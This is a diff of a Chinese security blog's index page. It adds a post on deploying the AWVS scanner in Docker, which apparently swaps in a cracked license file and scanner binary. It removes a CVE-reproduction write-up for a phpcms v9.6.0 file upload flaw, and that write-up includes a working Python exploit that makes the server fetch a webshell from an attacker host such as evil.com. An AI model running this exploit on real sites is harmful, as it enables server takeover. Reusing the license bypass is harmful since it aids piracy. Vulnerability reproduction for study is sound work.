@@ -66,6 +66,104 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-docker部署awvs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/03/18/docker%E9%83%A8%E7%BD%B2awvs/" class="article-date">
+  <time class="dt-published" datetime="2020-03-18T09:21:36.011Z" itemprop="datePublished">2020-03-18</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/03/18/docker%E9%83%A8%E7%BD%B2awvs/">docker部署awvs</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="docker部署awvs"><a href="#docker部署awvs" class="headerlink" title="docker部署awvs"></a>docker部署awvs</h1><p>链接: <a href="https://pan.baidu.com/s/1QqtdmgOOd-CCPgmD1aZMCw" target="_blank" rel="noopener">https://pan.baidu.com/s/1QqtdmgOOd-CCPgmD1aZMCw</a> 提取码: buti </p>
+<p>将百度云下载内容放到awvs文件夹下</p>
+<p>Dockerfile</p>
+<pre><code class="dockerfile">FROM ubuntu:16.04
+COPY awvs /awvs
+EXPOSE 3443
+RUN /awvs/setenv.sh&amp;&amp; echo -e &quot;\nyes\nubuntu\nccreater@163.com\nccr,123456\nccr,123456\n&quot;|/awvs/acunetix_13.0.200217097_x64_.sh &amp;&amp; \
+cp /awvs/wvsc /home/acunetix/.acunetix/v_200217097/scanner/wvsc &amp;&amp;\
+cp /awvs/license_info.json  /home/acunetix/.acunetix/data/license/license_info.json &amp;&amp;\
+echo -e &#39;#!/bin/bash\nsu acunetix &amp;&amp; (nohup bash ~/.acunetix/start.sh &amp;) &amp;&amp; exit&#39;&gt; /etc/rc.local
+</code></pre>
+<p>setenv.sh</p>
+<pre><code class="shell">#!/bin/bash
+
+shared_obj_deps=(libpango-1.0.so.0 libXext.so.6 libpthread.so.0 libXi.so.6 libgobject-2.0.so.0 libgtk-3.so.0 libdl.so.2 libgdk_pixbuf-2.0.so.0 libX11.so.6 libuuid.so.1 librt.so.1 libexpat.so.1 libglib-2.0.so.0 libXdamage.so.1 libatk-1.0.so.0 libm.so.6 libatspi.so.0 libcups.so.2 libgio-2.0.so.0 libXfixes.so.3 libXrender.so.1 libxcb.so.1 libsmime3.so libcairo.so.2 libXcomposite.so.1 libgdk-3.so.0 libpangocairo-1.0.so.0 libgcc_s.so.1 libX11-xcb.so.1 libdbus-1.so.3 libnss3.so libXrandr.so.2 libnspr4.so libXcursor.so.1 libnssutil3.so libXss.so.1 libasound.so.2 libatk-bridge-2.0.so.0 libc.so.6 libXtst.so.6)
+read -d &#39;&#39; source &lt;&lt;EOF
+deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-properties
+deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted
+deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-properties
+deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted
+deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-properties
+deb http://mirrors.aliyun.com/ubuntu/ xenial universe
+deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe
+deb http://mirrors.aliyun.com/ubuntu/ xenial multiverse
+deb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiverse
+deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse
+deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-properties
+deb http://archive.canonical.com/ubuntu xenial partner
+deb-src http://archive.canonical.com/ubuntu xenial partner
+deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted
+deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-properties
+deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe
+deb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse
+EOF
+echo &quot;$source&quot; &gt; /etc/apt/sources.list 
+cat /etc/apt/sources.list 
+apt-get update
+#for i in ${shared_obj_deps[@]}
+#do
+#    echo install $i
+#    apt-get install $i -y
+#done
+apt-get install libxdamage1 libgtk-3-0 libasound2 libnss3 libxss1 bzip2 sudo libv8-dev -y
+echo &quot;install success&quot;
+</code></pre>
+<p>将Dockerfile放在awvs同级目录下,打开命令行移动到Dockerfile所在文件夹,<code>docker build -t awvs .</code></p>
+<p>用Dockerfile创建镜像后,用<code>docker run --privileged=true -p 443:3443-it -d awvs &quot;/sbin/init&quot;</code>来创建容器</p>
+<p>接着等待一会就可以运行了,在改一下本机的hosts,美滋滋,记得是用https去访问</p>
+<p><img src="https://i.loli.net/2020/03/18/5nruJk7RmfLYjtw.png" alt="image3135"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://youngrichog.github.io/2019/08/10/Docker-AWVS批量部署/" target="_blank" rel="noopener">https://youngrichog.github.io/2019/08/10/Docker-AWVS%E6%89%B9%E9%87%8F%E9%83%A8%E7%BD%B2/</a> </p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/03/18/docker部署awvs/">http://blog.ccreater.top/2020/03/18/docker部署awvs/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/03/18/docker%E9%83%A8%E7%BD%B2awvs/" data-id="cka3ckr2n001tv4v033x5hixe" data-title="docker部署awvs" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-xctf高校抗疫" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/03/10/xctf%E9%AB%98%E6%A0%A1%E6%8A%97%E7%96%AB/" class="article-date">
@@ -2563,239 +2661,6 @@ print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.0/&quot;))</code></pre>
 
 
   
-    <article id="post-phpcms960任意文件上传复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" class="article-date">
-  <time class="dt-published" datetime="2020-02-12T13:55:39.359Z" itemprop="datePublished">2020-02-12</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/">phpcms960任意文件上传复现</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="phpcmsv9-6-0任意文件上传"><a href="#phpcmsv9-6-0任意文件上传" class="headerlink" title="phpcmsv9.6.0任意文件上传"></a>phpcmsv9.6.0任意文件上传</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>phpcms v9.6.0</p>
-<p>开启用户注册功能</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>根据网络上提供的poc进行漏洞复现:</p>
-<pre><code class="python">import re
-import requests
-
-
-def poc(url):
-    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)
-    data = {
-        &#39;siteid&#39;: &#39;1&#39;,
-        &#39;modelid&#39;: &#39;1&#39;,
-        &#39;username&#39;: &#39;test&#39;,
-        &#39;password&#39;: &#39;testxx&#39;,
-        &#39;email&#39;: &#39;test@test.com&#39;,
-        &#39;info[content]&#39;: &#39;&lt;img src=http://url/shell.txt?.php#.jpg&gt;&#39;,
-        &#39;dosubmit&#39;: &#39;1&#39;,
-    }
-    rep = requests.post(u, data=data)
-
-    shell = &#39;&#39;
-    re_result = re.findall(r&#39;&amp;lt;img src=(.*)&amp;gt&#39;, rep.content)
-    if len(re_result):
-        shell = re_result[0]
-        print shell
-</code></pre>
-<p>漏洞的关键位置</p>
-<p><code>phpcms/modules/member/index.php</code>:135</p>
-<pre><code class="php">if($member_setting[&#39;choosemodel&#39;]) {
-    require_once CACHE_MODEL_PATH.&#39;member_input.class.php&#39;;
-    require_once CACHE_MODEL_PATH.&#39;member_update.class.php&#39;;
-    $member_input = new member_input($userinfo[&#39;modelid&#39;]);        
-    $_POST[&#39;info&#39;] = array_map(&#39;new_html_special_chars&#39;,$_POST[&#39;info&#39;]);
-    $user_model_info = $member_input-&gt;get($_POST[&#39;info&#39;]);                                        
-}</code></pre>
-<p><code>$_POST[&#39;info&#39;]</code>被<code>new_html_special_chars</code>处理后,直接作为参数传入<code>$member_input-&gt;get</code></p>
-<p>跟进去发现</p>
-<pre><code class="php">if(is_array($data)) {
-            foreach($data as $field=&gt;$value) {
-                ...
-                $field = safe_replace($field);
-                ...
-                $func = $this-&gt;fields[$field][&#39;formtype&#39;];
-                if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value);
-
-                $info[$field] = $value;
-            }
-        }</code></pre>
-<p><code>$this-&gt;$func($field, $value);</code>令人浮想联翩的命令,而<code>$func = $this-&gt;fields[$field][&#39;formtype&#39;];</code>,其中<code>$field</code>是我们可控的输入<code>new_html_special_chars($_POST[&#39;info&#39;]) as $field=&gt;$value</code></p>
-<p>而<code>$this-&gt;fields[$field][&#39;formtype&#39;];</code>有以下取值,我们可以控制其执行某一函数</p>
-<pre><code class="php">$this-&gt;fields[&#39;catid&#39;][&#39;formtype&#39;]=&quot;catid&quot;
-$this-&gt;fields[&#39;typeid&#39;][&#39;formtype&#39;]=&quot;typeid&quot;
-$this-&gt;fields[&#39;title&#39;][&#39;formtype&#39;]=&quot;title&quot;
-$this-&gt;fields[&#39;keywords&#39;][&#39;formtype&#39;]=&quot;keyword&quot;
-$this-&gt;fields[&#39;copyfrom&#39;][&#39;formtype&#39;]=&quot;copyfrom&quot;
-$this-&gt;fields[&#39;description&#39;][&#39;formtype&#39;]=&quot;textarea&quot;
-$this-&gt;fields[&#39;updatetime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;
-$this-&gt;fields[&#39;content&#39;][&#39;formtype&#39;]=&quot;editor&quot;
-$this-&gt;fields[&#39;thumb&#39;][&#39;formtype&#39;]=&quot;image&quot;
-$this-&gt;fields[&#39;relation&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;
-$this-&gt;fields[&#39;pages&#39;][&#39;formtype&#39;]=&quot;pages&quot;
-$this-&gt;fields[&#39;inputtime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;
-$this-&gt;fields[&#39;posids&#39;][&#39;formtype&#39;]=&quot;posid&quot;
-$this-&gt;fields[&#39;groupids_view&#39;][&#39;formtype&#39;]=&quot;groupid&quot;
-$this-&gt;fields[&#39;voteid&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;
-$this-&gt;fields[&#39;islink&#39;][&#39;formtype&#39;]=&quot;islink&quot;
-$this-&gt;fields[&#39;url&#39;][&#39;formtype&#39;]=&quot;text&quot;
-$this-&gt;fields[&#39;listorder&#39;][&#39;formtype&#39;]=&quot;number&quot;
-$this-&gt;fields[&#39;template&#39;][&#39;formtype&#39;]=&quot;template&quot;
-$this-&gt;fields[&#39;allow_comment&#39;][&#39;formtype&#39;]=&quot;box&quot;
-$this-&gt;fields[&#39;status&#39;][&#39;formtype&#39;]=&quot;box&quot;
-$this-&gt;fields[&#39;readpoint&#39;][&#39;formtype&#39;]=&quot;readpoint&quot;
-$this-&gt;fields[&#39;username&#39;][&#39;formtype&#39;]=&quot;text&quot;</code></pre>
-<p>一个一个查看最后发现:</p>
-<pre><code class="php">    function editor($field, $value) {
-        $setting = string2array($this-&gt;fields[$field][&#39;setting&#39;]);
-        $enablesaveimage = $setting[&#39;enablesaveimage&#39;];
-        $site_setting = string2array($this-&gt;site_config[&#39;setting&#39;]);
-        $watermark_enable = intval($site_setting[&#39;watermark_enable&#39;]);
-        $value = $this-&gt;attachment-&gt;download(&#39;content&#39;, $value,$watermark_enable);
-        return $value;
-    }</code></pre>
-<p><code>editor</code>会调用download方法,其中<code>$field</code>和<code>$value</code>都是可控的</p>
-<p>跟进<code>download</code>:</p>
-<pre><code class="php">function download($field, $value,$watermark = &#39;0&#39;,$ext = &#39;gif|jpg|jpeg|bmp|png&#39;, $absurl = &#39;&#39;, $basehref = &#39;&#39;)
-    {
-        global $image_d;
-        $this-&gt;att_db = pc_base::load_model(&#39;attachment_model&#39;);
-        $upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);
-        $this-&gt;field = $field;
-        $dir = date(&#39;Y/md/&#39;);
-        $uploadpath = $upload_url.$dir;
-        $uploaddir = $this-&gt;upload_root.$dir;
-        $string = new_stripslashes($value);
-        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;
-        $remotefileurls = array();
-        foreach($matches[3] as $matche)
-        {
-            if(strpos($matche, &#39;://&#39;) === false) continue;
-            dir_create($uploaddir);
-            $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref);
-        }
-        unset($matches, $string);
-        $remotefileurls = array_unique($remotefileurls);
-        $oldpath = $newpath = array();
-        foreach($remotefileurls as $k=&gt;$file) {
-            if(strpos($file, &#39;://&#39;) === false || strpos($file, $upload_url) !== false) continue;
-            $filename = fileext($file);
-            $file_name = basename($file);
-            $filename = $this-&gt;getname($filename);
-
-            $newfile = $uploaddir.$filename;
-            $upload_func = $this-&gt;upload_func;
-            if($upload_func($file, $newfile)) {
-                $oldpath[] = $k;
-                $GLOBALS[&#39;downloadfiles&#39;][] = $newpath[] = $uploadpath.$filename;
-                @chmod($newfile, 0777);
-                $fileext = fileext($filename);
-                if($watermark){
-                    watermark($newfile, $newfile,$this-&gt;siteid);
-                }
-                $filepath = $dir.$filename;
-                $downloadedfile = array(&#39;filename&#39;=&gt;$filename, &#39;filepath&#39;=&gt;$filepath, &#39;filesize&#39;=&gt;filesize($newfile), &#39;fileext&#39;=&gt;$fileext);
-                $aid = $this-&gt;add($downloadedfile);
-                $this-&gt;downloadedfiles[$aid] = $filepath;
-            }
-        }
-        return str_replace($oldpath, $newpath, $value);
-    }    </code></pre>
-<p><code>download</code>用<code>$upload_func($file, $newfile)</code>来下载文件到服务器,而<code>$upload_func=&quot;copy&quot;</code></p>
-<p>我们分析一下<code>download</code>函数,<code>$file</code>和<code>$newfile</code>经过的处理</p>
-<p><code>$file</code>是<code>$remotefileurls</code>中的值</p>
-<pre><code class="php">        $string = new_stripslashes($value);//反转义
-        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;
-        $remotefileurls = array();
-        foreach($matches[3] as $matche)
-        {
-            if(strpos($matche, &#39;://&#39;) === false) continue;
-            dir_create($uploaddir);
-            $remotefileurls[$matche] = $this-&gt;fillurl($matche, &#39;&#39;, &#39;&#39;);
-        }</code></pre>
-<p>跟进<code>$this-&gt;fillurl</code>,大概功能是,去掉url<code>#</code>后面的东西</p>
-<pre><code class="php">function fillurl($surl, $absurl, $basehref = &#39;&#39;) {
-        ...
-        $pos = strpos($surl,&#39;#&#39;);
-        if($pos&gt;0) $surl = substr($surl,0,$pos);
-        ...
-    }</code></pre>
-<p>构造<code>$value=&#39;src=http://evil.com/evil.php#.jpg&#39;</code></p>
-<p>我们再看下<code>$newfile</code></p>
-<pre><code class="php">$dir = date(&#39;Y/md/&#39;);
-$uploaddir = $this-&gt;upload_root.$dir;
-$filename = fileext($file);
-$filename = $this-&gt;getname($filename);
-$newfile = $uploaddir.$filename;</code></pre>
-<p><code>$this-&gt;getname</code>:</p>
-<pre><code class="php">function getname($fileext){
-        return date(&#39;Ymdhis&#39;).rand(100, 999).&#39;.&#39;.$fileext;
-    }</code></pre>
-<p>webshell的地址为:<code>http://website/uploadfile/date(&#39;Y/md/&#39;)/date(&#39;Ymdhis&#39;).rand(100, 999).php</code></p>
-<p>最后payload为:</p>
-<pre><code>/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1
-post:
-info[content]=&lt;img src=&quot;http://evil.com/evil.php&quot;&gt;</code></pre><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><pre><code class="python">import re
-import requests
-import random
-
-def exp(url,evilurl=&quot;http://xxxxxxx/evil.php&quot;):
-    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)
-    data = {
-        &#39;siteid&#39;: &#39;1&#39;,
-        &#39;modelid&#39;: &#39;1&#39;,
-        &#39;username&#39;: &#39;test%d&#39;%random.randint(1,999999),
-        &#39;password&#39;: &#39;testxx&#39;,
-        &#39;email&#39;: &#39;test%d@test.com&#39;%random.randint(1,999999),
-        &#39;info[content]&#39;: &#39;src=%s#.jpg&#39;%evilurl,
-        &#39;dosubmit&#39;: &#39;1&#39;,
-    }
-    rep = requests.post(u, data=data)
-    result=re.search(r&quot;VALUES \(&#39;src=(.*)&#39;,&#39;\d*&#39;\)&quot;,rep.text).groups()
-    print(rep.text)
-    print(result)
-
-
-exp(&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;)</code></pre>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/12/phpcms960任意文件上传复现/">http://blog.ccreater.top/2020/02/12/phpcms960任意文件上传复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" data-id="cka3ckr31002tv4v04u2t8x65" data-title="phpcms960任意文件上传复现" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -2853,6 +2718,10 @@ exp(&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;)</code></pre>
       <ul>
         
           <li>
+            <a href="/2020/05/20/bypass_csp/">bypass_csp</a>
+          </li>
+        
+          <li>
             <a href="/2020/05/12/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/">2020年网鼎杯青龙组</a>
           </li>
         
@@ -2866,10 +2735,6 @@ exp(&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;)</code></pre>
         
           <li>
             <a href="/2020/05/05/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">maven学习笔记</a>
-          </li>
-        
-          <li>
-            <a href="/2020/05/05/4%E6%9C%88%E5%81%9A%E9%A2%98/">4月做题</a>
           </li>
         
       </ul>
